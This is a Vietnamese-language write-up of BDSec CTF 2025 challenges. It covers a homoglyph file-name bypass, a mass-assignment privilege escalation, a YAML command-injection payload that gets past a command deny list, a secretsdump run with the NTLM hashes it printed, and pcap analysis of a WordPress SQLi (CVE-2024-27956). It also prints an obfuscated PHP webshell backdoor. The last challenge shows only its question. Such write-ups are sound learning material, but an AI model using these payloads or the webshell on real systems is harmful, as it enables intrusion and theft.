---
title: "[Write-up] BDSec CTF 2025"
published: 2025-07-22
tags: [CTF, BDSecCTF]
category: Write-up
description: Thật vui khi ghi được điểm trong cuộc thii
draft: false
image: /assets/data/bannerbdsec.png
---

# Web

## Evil File reader
>You gained access to the server — nice work. A quick sweep shows nothing unusual, and flag.txt is nowhere to be found. But we know the flag is there.<br>
Maybe you're missing something... or maybe your tools are lying to you.<br>
Some files hide in plain sight. Some characters look familiar but act very differently. Sometimes, a single byte can change everything.<br>
Flag Format : BDSEC{something}

Ta cần đọc tệp chứa flag ```flag.txt``` nhưng bị chặn ```Nice try! Blocked.``` 

Bybass bằng cách sử dụng chữ cái tiếng Nga```cyclic```

```flаg.txt``` nhìn thì có vẻ giống nhưng thực chất khác nhau

```
flag: BDSEC{cd2342e6b6d40aa0b537e1e5e893b51c}
```

## Special Access
>Description: Try to access the flag.<br>
Flag Format: BDSEC{FlaG_HeRe}

Ta được cung cấp 1 trang web có form đăng kí, đăng nhập, tạo tải khoản và đăng nhập thì thấy không có gì cả vì chỉ có  ```role``` là ```user``` . Chúng ta cần phải nâng quyền lên ```admin```

![image](/assets/data/bdsec1.png)

Ngoài ra còn có ```profile``` để cập nhật mật khẩu, lợi dụng lỗ hổng này ta có thể nâng ```role``` lên ```admin``` 

![image](/assets/data/bdsec2.png)

![image](/assets/data/bdsec3.png)

```
flag: BDSEC{MaSs_ASSignmEnt_Expl0itEd}
```

## Yeti Killer
>he devs got lazy and decided to use a simple text-based configuration parser. Unfortunately, they also exposed it to the public. Can you exploit it and find the hidden flag?<br>
The server is expecting a plain text payload, but what happens when you send it some YAML?<br>
Flag Format : BDSEC{something}<br>

Đây là 1 trang web chuyển đổi ```YAML``` sang ```JSON``` nhưng có một lỗ hổng khá nghiêm trọng là sẽ parse bất kỳ YAML nào được gửi vào và cho phép thực thi mã 

```javascript
console.log(req.body.legth);
        const data = yaml.load(req.body);
        const command = data.command; 

        if (command) {
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    return res.status(500).send(`Error executing command: ${error.message}`);
                }
                if (stderr) {
                    return res.status(500).send(`Error: ${stderr}`);
                }
                return res.send(`Command output: ${stdout}`);
            });
        } else {
            return res.status(400).send("No command provided");
```
Tuy có lọc 1 số lệnh nguy hiểm nhưng vẫn dễ dàng vượt qua

```javascript
if (req.body.includes("flag") || req.body.includes("echo") || req.body.includes("cat") || req.body.includes("curl")|| req.body.includes("wget")){
            return res.status(403).send("No flags!");
        }
        if (req.body.includes("\\") || req.body.includes("/") || req.body.includes("!!") || req.body.includes("<")) {
            return res.status(403).send("Hacking attempt detected!");
        }
```

có thể thay thế lệnh ```cat``` bằng ```xargs``` và chuỗi ```flag.txt``` bằng cách sử dụng ```ls``` kết hợp với ```grep```

```
curl -X POST http://45.79.9.104:3000/ \                                                                                         -H "Content-Type: text/plain" \
  --data 'command: ls'

Command output: README.md
docker-compose.yaml
dockerfile
flag.txt
node_modules
package-lock.json
package.json
player_file.zip
restart.sh
server.js
views
```

```
curl -X POST http://45.79.9.104:3000/ \
  -H "Content-Type: text/plain" \
  --data 'command: "bash -c '\''$(ls | grep fl | xargs head -n 5)'\''"'

Error executing command: Command failed: bash -c '$(ls | grep fl | xargs head -n 5)'
bash: BDSEC{094ae1350eefe059b84faa0bd9ce2588}: command not found
```

```
flag: BDSEC{094ae1350eefe059b84faa0bd9ce2588}
```
# Fornsics

## Poisoned Ledger hex
>During a routine audit of a private blockchain test network, KSHACKZONE investigator 'B' reported anomalies in a handful of transaction blocks. While most of the ledger appears routine, certain scattered transactions include nonstandard embedded data fields that don’t follow expected formats<br>
>Your task is to examine the chain and recover whatever was silently injected. The payload is likely fragmented — and may be obscured in a way that relates back to the analyst who flagged it.<br>
>Flag Format : BDSEC{something_here}

Ta nhận được cung cấp 1 file ```.json``` với 3 block gồm các con số

```
[0, 6, 17, 7, 1, 57, 0, 14, 114, 1, 9, 29, 1, 10, 3, 11, 44, 29, 6, 55, 47, 18, 29, 115, 119, 29, 4, 55, 44, 44, 27, 63]
```
Đề bài có đề cấp đến kí tự ```B``` nên ta sẽ ```xor``` từng kí tự với ```B```

```python
data = [0, 6, 17, 7, 1, 57, 0, 14, 114, 1, 9, 29, 1, 10, 3, 11, 44, 29, 6, 55, 47, 18, 29, 115, 119, 29, 4, 55, 44, 44, 27, 63]
decoded = [x ^ 66 for x in data]
chars = ''.join(chr(x) for x in decoded)
print(chars)
```

```
flag: BDSEC{BL0CK_CHAIn_DumP_15_FunnY}
```

## Phishing Trail
>One of the users has been compromised via a phishing email. Identify the attacker's email address and the name of the file used in the payload (with extension).<br>
Flag format: BDSEC{attackeremailaddress_file.extension}<br>
The forensics file from KShackZone’s Phishing Breach Investigation should be used for this challenge.

Với file ổ đĩa window khá nặng như này ta nên sử dụng ```autopsy``` để phân tích cho dễ

Mục tiêu là Tìm file chứa mã độc và email của người lừa đảo đã chèn mã độc

Với rất nhiều người dùng và hàng trăm email thì xem từng cái một rất mất thời gian, thì file mã độc kẻ tấn công thường để ở đường dẫn ```C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup``` để có thể thực thi ngay sau khi mở máy

![image](/assets/data/bdsec4.png)

Ta có thể thấy file mã độc ```.ws``` ở người dùng ```anika.d```, bây giờ ta sẽ quay lại thư mục email của người dùng này để tìm email của kẻ lừa đảo đã gửi

![image](/assets/data/bdsec5.png)

Ở ```email_50.eml``` ta thấy chính xác file mã độc đã gửi mà email của người này

```
flag: BDSEC{hr@corpp.local_SalaryReview.ws}
```

## Hidden in Plain Sight
> There are rumors that someone is attempting to start public streaming. Investigators believe they might find something that could help them proceed further with their investigation.<br>
Flag Format: BDSEC{something_here}<br>
The forensics file from KShackZone’s Phishing Breach Investigation should be used for this challenge.

Phát trực tuyến công khai thì có liên quan đến video nên ta sẽ phân tích các thư mục video ở trong thư mục ```users``` thường là ```public```

![image](/assets/data/bdsec6.png)

```
flag: BDSEC{hidden_ads_stream}
```
## Crack the Credentials
>Someone has escalated their access. Can you retrieve the Administrator account password?<br>
Flag Format: BDSEC{something}<br>
The forensics file from KShackZone’s Phishing Breach Investigation should be used for this challenge.

Để có thể lấy được mật khẩu của ```Administrator``` thì đầu tiên chúng ta cần trích xuất ```hash``` của các user trong window

Các hash này không được lưu ở dạng plaintext, mà được mã hóa và lưu trữ trong một file hệ thống quan trọng tên là:

```
C:\Windows\System32\config\SAM
```
Tuy nhiên, file này không thể truy cập trực tiếp khi Windows đang hoạt động vì nó luôn bị khóa bởi hệ thống, ta sẽ cần thêm file ```SYSTEM```

```
SAM chứa hash mật khẩu.
SYSTEM chứa boot key để giải mã hash.
```
```
secretsdump.py -system "SYSTEM" -sam "SAM" LOCAL
/home/minhtuan/.local/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xecff3d62df5cb3df5de42d7a12b8dc5f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:22775c1ecbe2bd7d69c6dcd55b7f9b25:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4fa9775c90b54e688035a28e04d59a3c:::
james.l:1000:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
amir.k:1001:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
sadia.b:1002:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
karim.r:1003:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
anika.d:1004:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
rashed.h:1005:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
nafisa.j:1006:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
sumon.t:1007:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
nazia.c:1008:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
arif.w:1009:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
kamal.n:1010:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
bilkis.z:1011:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
rubel.m:1012:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
tania.y:1013:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
robin.p:1014:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
sohan.v:1015:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
nayeem.d:1016:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
salma.q:1017:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
hossain.a:1018:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
meem.u:1019:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
support_admin:1020:aad3b435b51404eeaad3b435b51404ee:8a46225c4f14f99711b0c2d6002d3af2:::
[*] Cleaning up...
```

Đã lấy được hash của ```Administrator```. Sử dụng ```john``` hay ```hashcat``` để tấn công từ điển lấy mật khẩu nhưng không thành công


# Networking

## Hosts
> A serious incident occurred inside a corporate network — an attacker successfully breached the internal environment. What followed was a series of stealthy moves: network reconnaissance, service enumeration, exploitation, and finally, remote code execution (RCE).<br>
Unfortunately, the entire attack was not captured during the incident but we were to capture some of it.<br>
Your mission is to analyze the traffic, uncover the attacker’s techniques, and piece together the timeline of the breach.<br>
There are 13 challenges, each one revealing a new step in the attack. Challenges unlock progressively as you solve them, leading you deeper into the incident.<br>
Do you have what it takes to uncover the full story behind the intrusion?<br>
Question 1: How many live hosts were scanned


Để tìm xem có bao nhiêu ```hosts``` được quét ta phải hiểu quy trình bắt tay 3 bước kiểu như này
```
Bước 1: SYN = 1, ACK = 0 Client gửi yêu cầu bắt đầu kết nối.
Bước 2: SYN = 1, ACK = 1 Server chấp nhận và phản hồi.
Bước 3: ACK = 1          Client xác nhận, kết nối hoàn tất.
```

Ta sẽ lọc các gói ```syn``` bắt đầu kết nối và in ra ip của nó, tức là các host được quét. Sử dụng ```tsark``` để dễ dàng

```
tshark -r file-1.pcapng -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e ip.dst | uniq

116.203.91.91
192.168.1.5
```

```
flag: BDSEC{2}
```

## Ports
>How many ports are open for 192.168.1.5?

Để xem có bao nhiêu ```port``` đang mở ở địa chỉ ip ```192.168.1.5``` chúng ta sẽ trích xuất các gói tin đã chấp nhận và phản hồi tức là ```syn = 1 và ack = 1```

```
tshark -r file-1.pcapng -Y "ip.src == 192.168.1.5 && tcp.flags.syn == 1 && tcp.flags.ack == 1" -T fields -e tcp.srcport | sort | uniq

22
7426
80
```

```
flag: BDSEC{3}
```

## Router
>Can you identify the router name?

Để xác định tên bộ định tuyến cách đơn giản nhất là chúng ta sẽ dò địa chỉ IP mặc định gateway

```
 tshark -r file-1.pcapng -T fields -e ip.src -e eth.src | sort | uniq

0.0.0.0 b4:ef:39:54:6a:90
        08:00:27:51:58:2d
103.146.42.114  64:ee:b7:47:fa:42
116.203.91.91   64:ee:b7:47:fa:42
142.250.77.142  64:ee:b7:47:fa:42
192.168.1.1     64:ee:b7:47:fa:42
192.168.1.5     9c:2f:9d:7e:74:6b
192.168.1.7     9c:2f:9d:7e:74:6b
192.168.1.9     38:a2:8c:20:1b:d9
        38:a2:8c:20:1b:d9
        40:45:da:d5:a0:1f
64.233.170.188  64:ee:b7:47:fa:42
        64:ee:b7:47:fa:42
        9c:2f:9d:7e:74:6b
        b4:ef:39:54:6a:90
```
Thiết bị có IP ```192.168.1.1``` và MAC ```64:ee:b7:47:fa:42``` chính là router/gateway trong mạng này, dùng trang web [https://macvendors.com/](này) để tra cứu tên bộ định tuyến dựa trên địa chỉ MAC

```
flag: BDSEC{netis}
```

## Enumeration
> What tool did the attacker use to perform basic enumeration?<br>
Flag Format: BDSEC{tool_name_along_with_version} Example Flag: BDSEC{dirb_1.2.3}

Để biết được công cụ của kẻ tấn công sử dụng để liệt kê các tệp thì mỗi gói tin có trường ```user_agent``` sẽ cho ta biết công cụ cũng như phiên bản 

```
tshark -r file-2.pcapng -Y "http.request" -T fields -e http.user_agent | sort | uniq
....
feroxbuster/2.11.0
GT::WWW
http client
HTTP::Lite
libcurl-agent/1.0
libwww
lwp-trivial
MFC_Tear_Sample
Mozilla/5.0
```
```
flag: BDSEC{feroxbuster_2.11.0}
```

## Creadentials
>What's the credential that the attacker used to access the dashboard?

Để biết kẻ tấn công đã sử dụng thông tin đăng nhập nào để truy cập vào bảng điều khiển ta sẽ lọc các gói tin với method ```POST``` và có chưa trường ```login```

```
http.request.method == "POST" && http contains "login"
```
![image](/assets/data/bdsec7.png)

Ta sẽ thấy gói tin ```/wp-login.php```
![image](/assets/data/bdsec8.png)

```
flag: BDSEC{eviladmin_admin}
```

## Version
>What's the version of the vulnerable component that the attacker exploited?<br>
Flag Format: BDSEC{2.4.5}

Các gói tin trên cho ta thấy được kẻ tấn công đã khai thác trên ```wp-automatic``` cụ thể là

```
/wp-content/plugins/wp-automatic/inc/csv.php
```

Đây là cuộc tấn công khai thác SQLi trên phiên bản wp <= 3.92.0

```
BDSEC{3.92.0}
```

## CVE
>What's the CVE ID of the vulnerability that the attacker exploited?<br>
Flag Format: BDSEC{CVE-2019-21542}

Dựa và dấu vết của cuộc tấn công ở trên thì đây là ```CVE-2024-27956``` loại SQLi

```
flag: BDSEC{CVE-2024-27956}
```

## FileName & Param
>What file did the attacker use to achieve RCE?<br>
file-4.pcapng<br>
Flag Format: BDSEC{file.txt_param}

Ta sẽ lọc các gói tin với ```method POST```

![image](/assets/data/bdsec9.png)

Ta thấy có các gói tin ```POST /wp-admin/admin-ajax.php HTTP/1.1``` đáng ngờ, đây là 1 payloas RCE 

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 192.168.1.5:7426
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.5:7426/wp-admin/theme-editor.php?file=patterns%2Ffooter.php&theme=twentytwentyfive
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 85
Origin: http://192.168.1.5:7426
Connection: keep-alive
Cookie: wordpress_c453a63f6ba5895c14a5bcf14c578651=eviladmin%7C1753123832%7CY4hhnWoXOTS71wdQPRaKlxttG4mG7wzVT6Fth04oFKq%7C1ded2ae46933e271fe9383a7146aac867442dac0786bc6969c110162025be7ee; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_c453a63f6ba5895c14a5bcf14c578651=eviladmin%7C1753123832%7CY4hhnWoXOTS71wdQPRaKlxttG4mG7wzVT6Fth04oFKq%7Cc039a2d08c9c3148ab39850634351b2a2683acf71f204461bf44368e3740a11a; wp-settings-time-2=1752952978

....
```
ở phần ```Referer``` kẻ tấn công đã sử dụng theme ```twentytwentyfive``` của ```theme-editor.php``` để chỉnh sửa file ```footer.php``` rồi gửi đến ```/wp-admin```

Trích xuất các gói tin ```footer.php``` ta thấy có rất nhiều truy vấn 

![image](/assets/data/bdsec10.png)

```
flag: BDSEC{footer.php_nstech}
```

## Key to Execution
>What key & parameter did the attacker use in the RCE?<br>
Flag Format: BDSEC{1234_param}

Kẻ tấn công đã gửi đến ```wp-admin/admin-ajax.php``` rất nhiều request

![image](/assets/data/bdsec11.png)

Trong số đó có gói tin chứa payload RCE rất đáng ngờ

![image](/assets/data/bdsec12.png)

Đoạn code này là webshell ```obfuscated``` được nhúng vào file PHP của WordPress (footer.php), cụ thể là một backdoor sử dụng XOR và base64, cho phép attacker thực thi lệnh tùy ý thông qua tham số ```c0MaNd```

```php
<?php
goto x6kM1;

T1F5b:
if (isset($_REQUEST["c0MaNd"]) && !empty($_REQUEST["c0MaNd"])) {
    $key += 1337 % 256;
    $encrypted = base64_decode($_REQUEST["c0MaNd"]);
    $decrypted = xor_cipher($encrypted, $key);
    ob_start();
    system($decrypted);
    $output = ob_get_clean();
    $encrypted_output = xor_cipher($output, $key);
    echo base64_encode($encrypted_output);
}
goto LYWUx;

x6kM1:
function xor_cipher($data, $key) {
    $out = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= $data[$i] ^ chr($key);
    }
    return $out;
}
goto T1F5b;

LYWUx:
?>

```

```
flag: BDSEC{1337_c0MaNd}
```

## User Name
>What is the normal user account name?<br>
file-6.pcapng<br>
Flag Format: BDSEC{name}




